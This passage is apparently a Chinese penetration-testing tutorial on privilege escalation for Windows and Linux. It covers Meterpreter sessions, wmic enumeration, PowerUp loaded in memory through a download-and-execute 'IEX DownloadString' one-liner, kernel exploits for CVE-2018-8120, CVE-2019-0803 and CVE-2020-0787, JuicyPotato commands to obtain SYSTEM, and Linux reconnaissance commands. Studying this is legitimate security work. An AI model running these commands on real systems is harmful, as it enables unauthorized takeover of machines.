class="headerlink" title="提权思路"></a>提权思路</h2><ul><li>前期信息收集  </li><li>Meterpreter提权  </li><li>Windows系统内核漏洞  </li><li>Windows服务提权漏洞</li></ul><h2 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h2><p>先生成一个payload ，并且创建监听</p><p>然后让受害者上线msf</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212091554180.png" alt="image-20240212091554180">  </p><h3 id="手动信息收集"><a href="#手动信息收集" class="headerlink" title="手动信息收集"></a>手动信息收集</h3><p>得到metepreter 之后</p><ul><li><p>获取补丁包</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic qfe <span class="hljs-built_in">get</span> Caption,Description,HotFixID,InstalledOn<br><br>wmic qfe <span class="hljs-built_in">get</span> Caption,Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">&quot;KBxxxxxx&quot;</span> /C:<span class="hljs-string">&quot;KBxxxxxx&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212091939430.png" alt="image-20240212091939430"></p></li><li><p>杀软收集</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212092039878.png" alt="image-20240212092039878"></p><p>也可以使用tasklist 的方式，然后使用在线查对应的有哪些杀软</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212092207818.png" alt="image-20240212092207818"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">wmic <span class="hljs-keyword">group</span><br><span class="hljs-title">组帐户管理。</span><br><span class="hljs-title"></span><br><span class="hljs-title">wmic</span> os<br>已安装操作系统的管理。<br><br>wmic process<br>进程管理<br><br>wmic service<br>服务应用程序管理。<br><br>wmic useraccount<br>用户帐户管理。<br><br>wmic startup<br>当用户登录到计算机系统时自动运行的命令的管理。<br><br>wmic nic<br>网络接口控制器(NIC)管理<br></code></pre></td></tr></table></figure></li></ul><h3 id="自动信息收集"><a href="#自动信息收集" class="headerlink" title="自动信息收集"></a>自动信息收集</h3><ul><li><p>HIGS.bat</p><p>  <a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat">Host</a><a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat"> </a><a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat">Information</a><a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat"> </a><a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat">Gathering</a><a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat"> </a><a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat">Script</a>  </p></li><li><p>winPEAS.bat  </p><p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat">privilege-escalation-awesome-scripts</a></p></li><li><p>Powerless</p></li></ul><p>  <a href="https://github.com/M4ximuss/Powerless">Windows</a><a href="https://github.com/M4ximuss/Powerless"> </a><a href="https://github.com/M4ximuss/Powerless">privilege</a><a href="https://github.com/M4ximuss/Powerless"> </a><a href="https://github.com/M4ximuss/Powerless">escalation</a><a href="https://github.com/M4ximuss/Powerless"> </a><a href="https://github.com/M4ximuss/Powerless">(enumeration)</a><a href="https://github.com/M4ximuss/Powerless"> </a><a href="https://github.com/M4ximuss/Powerless">script</a></p><ul><li>PowerUP</li></ul><p>  Powershell提权框架 -  Powerup，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。  </p><pre><code class="hljs">[https://github.com/PowerShellMaﬁa/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  </code></pre><p>  <a href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a></p><p>  使用说明</p><p>  加载脚本，这个是在cmd中</p>  <figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">powershell -nop -ep bypass<br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\PowerUp.psm1<br></code></pre></td></tr></table></figure><p>  查看所有的模块</p>  <figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Command</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">powerup</span><br></code></pre></td></tr></table></figure><p>  查看模块的详细信息</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Get</span><span class="hljs-operator">-</span>help [cmdlet] <span class="hljs-operator">-</span><span class="hljs-keyword">full</span><br><br><span class="hljs-keyword">Get</span><span class="hljs-operator">-</span>Help Find<span class="hljs-operator">-</span>DLLHijack <span class="hljs-operator">-</span><span class="hljs-keyword">full</span><br></code></pre></td></tr></table></figure><p>  导出结果</p>  <figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">Invoke-AllChecks | <span class="hljs-type">Out</span>-<span class="hljs-keyword">File</span> -Encoding ASCII checks.txt<br></code></pre></td></tr></table></figure><p>  cmd 环境运行</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -ep bypass -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>  内存加载</p>  <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure><p>  我们可以将这个脚本放置到服务器上面</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul><li><p>发现已知的内核信息</p><p>检查windows 系统版本是否存在任何已知的漏洞</p><p>列出所有的补丁</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic qfe <span class="hljs-built_in">get</span> Caption,Description,HotFixID,InstalledOn<br><br>powershell -c <span class="hljs-string">&quot;Get-WmiObject -query &#x27;select * from win32_quickfixengineering&#x27; | foreach &#123;<span class="hljs-variable">$_</span>.hotfixid&#125;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>列出更新的补丁</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;Get-Hotfix -description &#x27;Security update&#x27;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>已对外公开的exp</p><p>下面是相关的一些项目</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>windows-kernel-exploits<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Ascotbe/</span>Kernelhub<br>http:<span class="hljs-regexp">//</span>kernelhub.ascotbe.com<span class="hljs-regexp">/Home/</span>Docs<span class="hljs-regexp">/#/</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lyshark/</span>Windows-exploits<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212100615366.png" alt="image-20240212100615366"></p><p>可以这样搜索，查找对应的漏洞</p></li><li><p>使用网站查找对应的漏洞</p><p>  <a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="CVE-2018-8120"><a href="#CVE-2018-8120" class="headerlink" title="CVE-2018-8120"></a>CVE-2018-8120</h3><blockquote><p>  <a href="https://github.com/alpha1ab/CVE-2018-8120">https://github.com/alpha1ab/CVE-2018-8120</a>  </p></blockquote><p>使用方法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">exe</span> + <span class="hljs-string">&quot;要执行的命令&quot;</span><br></code></pre></td></tr></table></figure><p>尝试了使用win10 提权，但是没有用,win7 靶机也是不行的</p><p>如果可以的话，可以使用获取到的metepreter 然后使用shell exp 然后执行payload 这样就可以获得system的权限了</p><h3 id="CVE-2019-0803"><a href="#CVE-2019-0803" class="headerlink" title="CVE-2019-0803"></a>CVE-2019-0803</h3><blockquote><p>  <a href="https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe">https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe</a>  </p></blockquote><p>使用方法</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-built_in">exp</span> cmd 指令<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212120642548.png" alt="image-20240212120642548"></p><p>这个脚本可以，说明存在这个漏洞</p><h3 id="CVE-2020-0787"><a href="#CVE-2020-0787" class="headerlink" title="CVE-2020-0787"></a>CVE-2020-0787</h3><blockquote><p>  <a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases</a>  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212121622783.png" alt="image-20240212121622783"></p><p>先运行，然后就会弹出一个新的cmd这个是system权限的</p><h2 id="提权脚本"><a href="#提权脚本" class="headerlink" title="提权脚本"></a>提权脚本</h2><p>它会提示有哪些漏洞，可以用来提权</p><ol><li><p>JuicyPotato</p><blockquote><p><a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p></blockquote><p>使用这个工具的限制条件</p><blockquote><p>需要具有SeImpersonate或者SeAssignPrimaryToken权限  </p><p>开启DCOM 本地支持RPC或者远程服务器支持RPC并能成功登录</p><p>能够找到可用的COM对象 </p></blockquote><p> 一般从Web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。   一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，都可以执  行 whoami &#x2F;priv 查看是否具有权限。</p><p>查看当前的用户权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212141209658.png" alt="image-20240212141209658"></p><p>这个就是一个普通的权限</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212141327534.png" alt="image-20240212141327534"></p><p>这个是管理员权限</p><p>如果SeImpersonate权限为 enabled，juicypotato的参数可以使用-t t  如果SeAssignPrimaryToken权限为 enabled，juicypotato的参数可以使用-t u  如果均开启，可以选择 -t *  </p><p> 查看RPC默认端口是否为135  </p><p>如果被修改(例如为111)，juicypotato的参数可以使用-n 111  </p><p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：  </p><p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用-k  </p><p>例如Win7、WIn8系统，默认配置下，允许135端口的入站规则即可进行远程RPC登录，添加防火墙规则允许135端口入站的命令如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;135&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=135 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure><p>根据操作系统选择可用的CLSID  </p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a>  </p><p>其实CLSID也就是GUID，是区分每个系统组件唯一的识别码。我们通过CLSID就可以快捷的打开系统组件，这样可以让我们的操作更加方便。</p><p>CLSID或类标识符是一串字母数字（数字和字母字符）符号，用于表示组件对象模型或基于 COM 的  程序的特定实例。它允许操作系统和软件（尤其是 Windows 操作系统和软件）检测和访问软件组件，  而无需通过其名称进行识别。尽管微软已经逐步淘汰了COM的使用，转而使用.NET基础结构，但COM  仍然是许多常用程序的重要组成部分，并且没有停止使用的计划。  </p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs subunit">添加网络位置<br>shell:::&#123;D4480A50-BA28<span class="hljs-string">-11</span>d1<span class="hljs-string">-8</span>E75<span class="hljs-string">-00</span>C04FA31A86&#125;<br><br>管理工具<br>shell:::&#123;D20EA4E1<span class="hljs-string">-3957</span><span class="hljs-string">-11</span>d2-A40B<span class="hljs-string">-0</span>C5020524153&#125;<br><br>所有控制面板项<br>shell:::&#123;21EC2020<span class="hljs-string">-3</span>AEA<span class="hljs-string">-1069</span>-A2DD<span class="hljs-string">-08002</span>B30309D&#125;<br><br>所有设置<br>shell:::&#123;5ED4F38C-D3FF<span class="hljs-string">-4</span>D61-B506<span class="hljs-string">-6820320</span>AEBFE&#125;<br><br>所有任务<br>shell:::&#123;ED7BA470<span class="hljs-string">-8</span>E54<span class="hljs-string">-465</span>E<span class="hljs-string">-825</span>C<span class="hljs-string">-99712043</span>E01C&#125;<br><br>应用<br>shell:::&#123;4234d49b<span class="hljs-string">-0245</span><span class="hljs-string">-4</span>df3-b780<span class="hljs-string">-3893943456</span>e1&#125;<br><br>AppSuggestedLocations<br>shell:::&#123;c57a6066<span class="hljs-string">-66</span>a3<span class="hljs-string">-4</span>d91<span class="hljs-string">-9</span>eb9<span class="hljs-string">-41532179</span>f0a5&#125;<br><br>ActiveX缓存文件夹<br>shell:::&#123;88C6C381<span class="hljs-string">-2</span>E85<span class="hljs-string">-11</span>D0<span class="hljs-string">-94</span>DE<span class="hljs-string">-444553540000</span>&#125;<br><br>自动播放<br>shell:::&#123;9C60DE1E-E5FC<span class="hljs-string">-40</span>f4-A487<span class="hljs-string">-460851</span>A8D915&#125;<br><br>备份和还原（Windows7）<br>shell:::&#123;B98A2BEA<span class="hljs-string">-7</span>D42<span class="hljs-string">-4558</span><span class="hljs-string">-8</span>BD1<span class="hljs-string">-832</span>F41BAC6FD&#125;<br><br>BitLocker驱动器加密<br>shell:::&#123;D9EF8727-CAC2<span class="hljs-string">-4</span>e60<span class="hljs-string">-809</span>E<span class="hljs-string">-86</span>F80A666C91&#125;<br><br>蓝牙设备<br>shell:::&#123;28803F59<span class="hljs-string">-3</span>A75<span class="hljs-string">-4058</span><span class="hljs-string">-995</span>F<span class="hljs-string">-4</span>EE5503B023C&#125;<br><br>Briefcase<br>shell:::&#123;85BBD920<span class="hljs-string">-42</span>A0<span class="hljs-string">-1069</span>-A2E4<span class="hljs-string">-08002</span>B30309D&#125;<br><br>Cabinet Shell文件夹<br>shell:::&#123;0CD7A5C0<span class="hljs-string">-9</span>F37<span class="hljs-string">-11</span>CE-AE65<span class="hljs-string">-08002</span>B2E1262&#125;<br><br>命令文件夹<br>shell:::&#123;437ff9c0-a07f<span class="hljs-string">-4</span>fa0-af80<span class="hljs-string">-84</span>b6c6440a16&#125;<br><br>Common Places FS Folder<br>shell:::&#123;d34a6ca6<span class="hljs-string">-62</span>c2<span class="hljs-string">-4</span>c34<span class="hljs-string">-8</span>a7c<span class="hljs-string">-14709</span>c1ad938&#125;<br><br>CompressedFolder<br>shell:::&#123;E88DCCE0-B7B3<span class="hljs-string">-11</span>d1-A9F0<span class="hljs-string">-00</span>AA0060FA31&#125;<br><br>连接到<br>shell:::&#123;38A98528<span class="hljs-string">-6</span>CBF<span class="hljs-string">-4</span>CA9<span class="hljs-string">-8</span>DC0-B1E1D10F7B1B&#125;<br><br>控制面板<br>shell:::&#123;26EE0668-A00A<span class="hljs-string">-44</span>D7<span class="hljs-string">-9371</span>-BEB064C98683&#125;<br><br>控制面板<br>shell:::&#123;5399E694<span class="hljs-string">-6</span>CE5<span class="hljs-string">-4</span>D6C<span class="hljs-string">-8</span>FCE<span class="hljs-string">-1</span>D8870FDCBA0&#125;<br><br>凭据管理器<br>shell:::&#123;1206F5F1<span class="hljs-string">-0569</span><span class="hljs-string">-412</span>C<span class="hljs-string">-8</span>FEC<span class="hljs-string">-3204630</span>DFB70&#125;<br></code></pre></td></tr></table></figure><p>使用win R 执行这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212142400384.png" alt="image-20240212142400384"></p><p>监听端口</p><p>选择一个系统未占用的端口作为监听端口  </p><p>最终执行命令如下  </p><blockquote><p>C:&#x2F;test&#x2F; &gt;juicypotato.exe -t * -p “cmd.exe” -l 9001 -c {4991d34b-80a1-4291-83b6-3328366b9097}<br>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9001<br>……<br>[+] authresult 0<br>{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM</p><p>[+] CreateProcessWithTokenW OK</p></blockquote><blockquote><p>-t * : SeImpersonate权限和SeAssignPrimaryToken权限都开启<br>-p “cmd.exe” : 指定创建的进程<br>-l 9001 : 指定监听端口<br>-c {4991d34b-80a1-4291-83b6-3328366b9097} : 指定使用的CLSID</p></blockquote><p>如果将执行的程序变成payload 就可以直接反弹一个system 的权限</p><p>webshell 添加用户，同时也能执行命令或者是payload</p><blockquote><p>  <a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a>  </p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SweetPotato<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">a</span> whoami<br></code></pre></td></tr></table></figure></li></ol><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>前期信息收集  </li><li>Linux系统内核漏洞  </li><li>Linux服务提权漏洞  </li><li>SUDO权限滥用  </li><li>SUID提权  </li><li>GTFOBins</li></ul><h2 id="提权信息收集-1"><a href="#提权信息收集-1" class="headerlink" title="提权信息收集"></a>提权信息收集</h2><ol><li><p>linPEAS.sh  </p><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p></li></ol><p>   直接运行</p><p>   注意看有颜色的字</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212144942030.png" alt="image-20240212144942030"></p><p>   基础信息，有什么可以使用的软件</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212144909033.png" alt="image-20240212144909033"></p><p>   这个是可以尝试利用的编号</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212145013074.png" alt="image-20240212145013074"></p><ol start="2"><li><p>beRoot  </p><p><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a>  </p></li><li><p>操作系统命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看发行版本</span><br>cat /etc/issue<br>cat /etc/*-release<br>lsb_release -a<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看内核版本</span><br>uname –a<br>uname –mrs<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">环境变量</span><br>cat /etc/profile<br>cat /etc/bashrc<br>cat ~/.bash_profile<br>cat ~/.bashrc<br>cat ~/.bash_logout<br>env<br>set<br></code></pre></td></tr></table></figure></li><li><p>应用程序和服务信息</p></li></ol>   <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 系统网络信息</span><br><span class="hljs-string">/sbin/ifconfig</span> -a<br>cat <span class="hljs-string">/etc/network/interfaces</span><br>cat <span class="hljs-string">/etc/sysconfig/network</span><br><br><span class="hljs-comment"># 应用程序和服务</span><br>ps aux<br>ps -ef<br>top<br>cat <span class="hljs-string">/etc/services</span><br><br><span class="hljs-comment"># root用户运行的服务</span><br>ps aux | grep root<br>ps -ef | grep root<br><br><span class="hljs-comment"># 安装的应用程序</span><br><span class="hljs-keyword">ls</span> -alh <span class="hljs-string">/sbin/</span><br>dpkg -l<br>rpm -qa<br><span class="hljs-keyword">ls</span> -alh <span class="hljs-string">/var/cache/apt/archives</span><br><span class="hljs-keyword">ls</span> -alh <span class="hljs-string">/var/cache/yum/</span><br><br><span class="hljs-comment"># 服务配置错误</span><br>cat <span class="hljs-string">/etc/syslog.conf</span><br>cat <span class="hljs-string">/etc/chttp.conf</span><br>cat <span class="hljs-string">/etc/lighttpd.conf</span><br>cat <span class="hljs-string">/etc/cups/cupsd.conf</span><br>cat <span class="hljs-string">/etc/inetd.conf</span><br>cat <span class="hljs-string">/etc/apache2/apache2.conf</span><br>cat <span class="hljs-string">/etc/my.conf</span><br>cat <span class="hljs-string">/etc/httpd/conf/httpd.conf</span><br>cat <span class="hljs-string">/opt/lampp/etc/httpd.conf</span><br><span class="hljs-keyword">ls</span> -aRl <span class="hljs-string">/etc/</span> | awk &#x27;$1 ~ /^.*r.*/<br><br><span class="hljs-comment"># 计划任务</span><br>crontab -l<br><span class="hljs-keyword">ls</span> -alh <span class="hljs-string">/var/spool/cron</span><br><span class="hljs-keyword">ls</span> -al <span class="hljs-string">/etc/</span> | grep cron<br><span class="hljs-keyword">ls</span> -al <span class="hljs-string">/etc/cron</span>*<br>cat <span class="hljs-string">/etc/cron</span>*<br>cat <span class="hljs-string">/etc/cron.allow</span><br>cat <span class="hljs-string">/etc/cron.deny</span><br>cat <span class="hljs-string">/etc/crontab</span><br>cat <span class="hljs-string">/etc/anacrontab</span><br>cat <span class="hljs-string">/var/spool/cron/crontabs/root</span><br></code></pre></td></tr></table></figure><ol start="5"><li><p>常用的漏洞exp</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.exploit-db.com<br>https:<span class="hljs-regexp">//</span>www.securityfocus.com/bid<br>https:<span class="hljs-regexp">//</span>www.rapid7.com<span class="hljs-regexp">/db/</span><br>https:<span class="hljs-regexp">//</span>cxsecurity.com<span class="hljs-regexp">/exploit/</span><br>https:<span class="hljs-regexp">//</span>seclists.org<span 